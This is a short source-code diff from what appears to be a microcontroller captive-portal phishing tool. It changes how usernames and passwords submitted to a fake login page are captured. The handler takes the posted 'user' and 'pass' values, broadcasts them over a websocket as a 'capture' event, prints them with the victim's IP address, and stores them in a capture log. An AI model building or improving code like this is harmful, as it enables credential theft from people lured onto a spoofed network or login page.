@@ -6,6 +6,7 @@
 #include "device_logger.h"
 #include "obs_toast_html.h"
 #include "portal_html.h"
+#include "websocket_interface.h"
 
 extern "C" {
 #include "user_interface.h"
@@ -19,7 +20,6 @@ const byte DNS_PORT = 53;
 DNSServer dnsServer;
 AsyncWebServer server(80);
 AsyncWebSocket ws("/ws");
-
 std::vector<String> captureLog;
 
 void setup() {
@@ -49,9 +49,9 @@ void setup() {
     String user = request->getParam("user", true)->value();
     String pass = request->getParam("pass", true)->value();
 
-    String capture = "{\"user\":\"" + user + "\",\"pass\":\"" + pass + "\"}";
-    ws.textAll(capture);
-    capture = request->client()->remoteIP().toString() + " > " + capture;
+    String data = "{\"User\":\"" + user + "\",\"Pass\":\"" + pass + "\"}";
+    ws.textAll("{\"type\": \"capture\", \"data\": " + data + "}");
+    String capture = request->client()->remoteIP().toString() + " > " + data;
     Serial.println(capture);
     captureLog.push_back(capture);
 
